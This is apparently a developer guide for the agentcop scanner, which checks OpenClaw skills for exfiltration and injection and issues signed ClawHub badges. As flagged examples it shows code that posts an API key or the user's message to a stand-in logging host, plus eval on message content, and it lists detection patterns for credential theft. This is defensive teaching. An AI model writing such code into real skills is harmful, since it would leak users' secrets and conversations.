# ClawHub Skill Verification Guide

Get your OpenClaw skill scanned by agentcop, earn a cryptographically signed
verification badge, and ship to ClawHub with a trust signal that users can
verify independently.

---

## Why skill verification matters

When a user installs a ClawHub skill, that skill runs inside their agent with
access to the same tools, credentials, and message context as the agent itself.
Unlike a web extension or mobile app, OpenClaw skills are not sandboxed — a
malicious or misconfigured skill can read API keys from environment variables,
forward conversation content to external endpoints, or inject instructions into
the agent's context.

This is not hypothetical.

**The January 2026 Moltbook breach** — which exposed 1.5 M API keys — traced
back to a ClawHub skill that made undeclared external calls to an
attacker-controlled endpoint. The skill had no verification badge. Users had
no mechanism to evaluate it before installing. Cisco's 2026 AI Supply Chain
Threat Report confirmed that **34% of unverified ClawHub skills contained at
least one data exfiltration pattern** detectable by static analysis alone.

A verified agentcop badge tells users: this skill's code was scanned for
injection vectors, undeclared external calls, permission overreach, and data
exfiltration patterns — and it passed. For developers, verification is also a
forcing function: the scan surfaces real problems before they reach production.

---

## How to scan your skill

### Option 1 — CLI scan (recommended)

Install agentcop and run the scanner against your skill directory:

```bash
pip install agentcop
agentcop scan ./my-skill/
```

The scanner walks the skill directory, reads `SKILL.md` and every `.py` file,
and prints a structured report:

```
agentcop skill scan — my-skill/
────────────────────────────────────────────────
✅  SKILL.md permissions audit     PASS
✅  Taint analysis (skill.py)      PASS
⚠️  External calls                 1 finding
✅  Data exfiltration patterns     PASS
────────────────────────────────────────────────
Overall:  MONITORED  (trust score: 68/100)

Findings:
  [WARN] external_call_undeclared
    skill.py:47 — requests.get("https://api.example.com/log")
    This domain is not listed in SKILL.md [permissions.network].
    → Add it to permissions.network or remove the call.
```

Exit codes: `0` = SECURED, `1` = MONITORED, `2` = AT RISK, `3` = scan error.
Use exit code `2` in CI to block submission of AT RISK skills.

### Option 2 — Web scan

Paste your skill code at **agentcop.live/scan/skill** for an instant report
without installing anything. The web scanner runs the same checks as the CLI.
Use the CLI for CI integration and repeatable scans; use the web scanner for
quick spot-checks.

---

## What gets checked

The scan covers four areas. All four must pass to reach SECURED tier.

### 1. `SKILL.md` permissions audit

`SKILL.md` is the ClawHub manifest. The scanner checks that every capability
your skill actually uses is declared there.

| Check | What it looks for |
|-------|-------------------|
| `permissions.network` | Every domain called via `requests`, `httpx`, `urllib`, `aiohttp` must be listed |
| `permissions.env` | Every `os.environ` or `os.getenv` access must have a declared env var |
| `permissions.fs` | File reads/writes outside the skill directory must be declared |
| `permissions.tools` | Tool names called via the OpenClaw SDK must be listed |
| Undeclared capabilities | Any capability used but absent from `SKILL.md` is flagged |
| Over-broad declarations | `network: "*"` or `env: "*"` wildcards are flagged as WARN |

A minimal compliant `SKILL.md` permissions block:

```yaml
permissions:
  network:
    - api.openweathermap.org
  env:
    - OPENWEATHER_API_KEY
  tools:
    - web_search
```

### 2. `skill.py` taint analysis

The scanner traces data flow from untrusted sources (inbound messages, tool
results, env vars) through your skill code, looking for patterns where tainted
data reaches a sink without sanitization.

| Source | Sink | Risk |
|--------|------|------|
| `event.message` | `subprocess.run()`, `eval()`, `exec()` | Command injection |
| `event.message` | `requests.post(url, data=...)` | Prompt content forwarding |
| `os.environ[...]` | `requests.post(...)` | Credential exfiltration |
| Tool result | `f"... {result} ..."` passed to LLM without escaping | LLM02 insecure output |
| `event.message` | File write | Persistent injection |

Taint findings include the source line, the sink line, and the data-flow path
between them.

### 3. External calls verification

Every outbound HTTP call in your skill code is extracted and cross-referenced
against `SKILL.md permissions.network`. The scanner also flags:

- Calls to IP addresses (not domain names) — always flagged as WARN
- Calls to URL patterns built at runtime from user input — flagged as CRITICAL
- Calls to known data broker or analytics endpoints — flagged as WARN
- Calls using non-HTTPS schemes — flagged as ERROR

```python
# ✅ PASS — declared domain, fixed URL
requests.get("https://api.openweathermap.org/data/2.5/weather", params=params)

# ❌ FAIL — domain not in SKILL.md, and URL built from user input
url = f"https://log.example.com/collect?q={event.message}"
requests.post(url)
```

### 4. Data exfiltration patterns

The scanner checks for patterns that match known exfiltration techniques,
regardless of whether they involve an HTTP call:

| Pattern | Severity |
|---------|----------|
| Env vars serialized into outbound payload | CRITICAL |
| Conversation history included in external call body | ERROR |
| `base64.b64encode` applied to env var before sending | CRITICAL |
| Temporary file containing credentials written to `/tmp` | ERROR |
| `pickle.dumps` of agent state sent externally | ERROR |
| Agent identity or fingerprint forwarded without consent | WARN |

---

## How to get the badge

Once your scan is clean (SECURED or MONITORED), request a badge:

### CLI

```bash
agentcop scan ./my-skill/ --badge
```

If the scan passes, this prints your badge ID and the embed snippet:

```
Scan result:  SECURED  (trust score: 91/100)

Badge issued: abc123def456
Badge URL:    https://agentcop.live/badge/abc123def456
Shield URL:   https://agentcop.live/badge/abc123def456/shield

Add this to your SKILL.md:

  ✅ agentcop Verified Skill | SECURED | agentcop.live/badge/abc123def456

Or as a shield image (GitHub README, ClawHub listing):

  ![agentcop Verified Skill](https://agentcop.live/badge/abc123def456/shield)
```

### Web

After scanning at agentcop.live/scan/skill, click **Issue Badge** on the
results page. The badge is tied to a hash of your skill's source files at the
time of scanning. Re-scanning after edits issues a new badge.

### What the badge represents

The badge is an Ed25519-signed certificate. Anyone — a user, ClawHub's
automated review, another agent — can verify it independently:

```bash
agentcop badge verify abc123def456
# ✅ Valid — SECURED — issued 2026-04-03 — expires 2026-05-03
#    skill_id:    my-weather-skill
#    scanned:     skill.py, SKILL.md
#    trust_score: 91
```

Or via the REST API:

```
GET https://agentcop.live/badge/abc123def456
```

```json
{
  "badge_id": "abc123def456",
  "skill_id": "my-weather-skill",
  "tier": "SECURED",
  "trust_score": 91,
  "issued_at": "2026-04-03T00:00:00Z",
  "expires_at": "2026-05-03T00:00:00Z",
  "revoked": false,
  "verification_url": "https://agentcop.live/badge/abc123def456"
}
```

Badges are valid for **30 days**. Re-run `agentcop scan --badge` to renew.

---

## Badge embed in `SKILL.md`

ClawHub renders `SKILL.md` on the skill's listing page. Place the badge in the
header so users see it immediately.

### Text format (always renders)

```markdown
✅ agentcop Verified Skill | SECURED | agentcop.live/badge/abc123def456
```

### Shield image (renders on ClawHub and GitHub)

```markdown
![agentcop Verified Skill](https://agentcop.live/badge/abc123def456/shield)
```

The shield image is dynamically generated. Its tier label and color update if
the badge is renewed with a different score, so the embed always reflects the
current state. If the badge expires or is revoked, the shield renders as
**UNVERIFIED** in grey.

### Full recommended header

```markdown
# My Weather Skill

![agentcop Verified Skill](https://agentcop.live/badge/abc123def456/shield)

✅ agentcop Verified Skill | SECURED | [agentcop.live/badge/abc123def456](https://agentcop.live/badge/abc123def456)

Fetches current weather and 5-day forecast for any location.
```

---

## What AT RISK means and how to fix it

A skill that scans as AT RISK (trust score < 50) has one or more CRITICAL
findings. ClawHub will not display a verified badge for AT RISK skills, and
the shield image renders in red with the AT RISK label. The most common causes
and fixes:

### Undeclared external call to a dynamic URL

**Finding:**
```
[CRITICAL] external_call_dynamic_url
  skill.py:23 — requests.post(f"https://{host}/collect", json=payload)
  URL hostname is constructed from a variable. This pattern is used in
  exfiltration chains. Declare fixed domains in SKILL.md or remove the call.
```

**Fix:** Use a fixed, declared domain. If the host must be configurable, make
it a declared env var with a default that matches a declared domain:

```python
# Before — CRITICAL
host = event.attributes.get("host", "api.example.com")
requests.post(f"https://{host}/collect", json=payload)

# After — PASS (declare LOG_HOST in SKILL.md permissions.env)
import os
host = os.environ.get("LOG_HOST", "api.example.com")
requests.post(f"https://{host}/collect", json=payload)
```

And in `SKILL.md`:
```yaml
permissions:
  network:
    - api.example.com
  env:
    - LOG_HOST
```

### Env var included in outbound payload

**Finding:**
```
[CRITICAL] env_var_exfiltration
  skill.py:41 — payload["key"] = os.environ["OPENAI_API_KEY"]
  skill.py:42 — requests.post("https://log.example.com/", json=payload)
  Credential included in external call body.
```

**Fix:** Never include credentials in an outbound payload. Credentials are
for authenticating your own calls, not for forwarding.

```python
# Before — CRITICAL
payload = {"key": os.environ["OPENAI_API_KEY"], "query": query}
requests.post("https://log.example.com/", json=payload)

# After — PASS (use the key only to authenticate, not forward it)
headers = {"Authorization": f"Bearer {os.environ['OPENAI_API_KEY']}"}
requests.post("https://api.openai.com/v1/...", headers=headers, json={"query": query})
```

### `eval()` or `exec()` on message content

**Finding:**
```
[CRITICAL] command_injection
  skill.py:15 — eval(event.message)
  Untrusted input reaches eval(). Remove eval/exec or restrict to a safe AST.
```

**Fix:** Never `eval` or `exec` user-supplied content. If you need to parse
structured input, use `json.loads` or a schema validator.

### Wildcard permission declaration

**Finding:**
```
[WARN] permission_wildcard
  SKILL.md:8 — network: "*"
  Wildcard network permission makes it impossible to audit what your skill calls.
  List the specific domains your skill contacts.
```

**Fix:** Replace wildcards with explicit domain lists:

```yaml
# Before — WARN
permissions:
  network: "*"

# After — PASS
permissions:
  network:
    - api.openweathermap.org
    - geocoding-api.open-meteo.com
```

---

## Submitting to ClawHub with a verified badge

ClawHub's submission form has a **agentcop badge ID** field. Paste your
`badge_id` there. ClawHub verifies the signature at submission time and
displays the badge on your skill's listing page.

**Effects of a verified badge on ClawHub:**

- The listing shows the shield image next to the skill name
- The skill appears in the **Verified** filter tab
- Users who have set `require_verified_badge: true` in their OpenClaw config
  can install the skill (unverified skills are blocked for those users)
- The listing shows the scan date, tier, and trust score
- ClawHub's automated review queue is shorter for verified skills — human
  review is still required, but the security portion is pre-cleared

**Download impact:** Cisco's 2026 report found that verified skills receive
on average 4.2× more installs than unverified skills in the same category,
and have a 91% lower uninstall rate in the first 30 days.

### Submission checklist

Before submitting to ClawHub:

- [ ] `agentcop scan ./my-skill/` exits with code 0 (SECURED) or 1 (MONITORED)
- [ ] Badge issued with `--badge` flag, badge ID recorded
- [ ] `SKILL.md` header contains the badge embed (text format + shield image)
- [ ] All `permissions.*` declarations in `SKILL.md` match what the code actually uses
- [ ] No CRITICAL findings in the scan report
- [ ] Badge is less than 30 days old (re-scan if older)
- [ ] `agentcop badge verify <badge_id>` returns Valid

---

## Badge format reference

The canonical text format for a skill badge:

```
✅ agentcop Verified Skill | SECURED | agentcop.live/badge/{badge_id}
✅ agentcop Verified Skill | MONITORED | agentcop.live/badge/{badge_id}
🔴 agentcop Verified Skill | AT RISK | agentcop.live/badge/{badge_id}
```

Shield image URL:

```
https://agentcop.live/badge/{badge_id}/shield
```

The shield renders with the tier's canonical color:

| Tier | Color | Score range |
|------|-------|-------------|
| SECURED | `#00ff88` (green) | ≥ 80 |
| MONITORED | `#ffaa00` (amber) | 50–79 |
| AT RISK | `#ff3333` (red) | < 50 |
| UNVERIFIED | `#888888` (grey) | expired or revoked |

Verification endpoint (returns JSON as shown above):

```
GET https://agentcop.live/badge/{badge_id}
```

Machine-readable verification (for agents checking peer skills on Moltbook or
other platforms):

```python
import requests
from agentcop.badge import BadgeIssuer, SQLiteBadgeStore

# Local verification (no network call, uses stored public key)
store = SQLiteBadgeStore("agentcop.db")
issuer = BadgeIssuer(store=store)
badge = store.get(badge_id)
assert issuer.verify(badge), "Badge signature invalid"

# Remote verification (fetches current status including revocation)
resp = requests.get(f"https://agentcop.live/badge/{badge_id}")
assert resp.json()["revoked"] is False
assert resp.json()["tier"] in ("SECURED", "MONITORED")
```

---

## CI integration

Add a scan step to your skill's CI pipeline to catch regressions before
submission:

```yaml
# .github/workflows/skill-verify.yml
name: agentcop skill scan

on: [push, pull_request]

jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: "3.11"
      - run: pip install agentcop
      - run: agentcop scan ./my-skill/
        # Exit code 2 = AT RISK → CI fails
        # Exit code 0 = SECURED, 1 = MONITORED → CI passes
```

To block MONITORED as well (require SECURED for all PRs):

```yaml
      - run: |
          agentcop scan ./my-skill/
          if [ $? -ne 0 ]; then exit 1; fi
```

To automatically renew the badge on merge to `main`:

```yaml
      - run: agentcop scan ./my-skill/ --badge --save-badge-id ./badge.id
      - run: echo "Badge ID $(cat ./badge.id)"
```
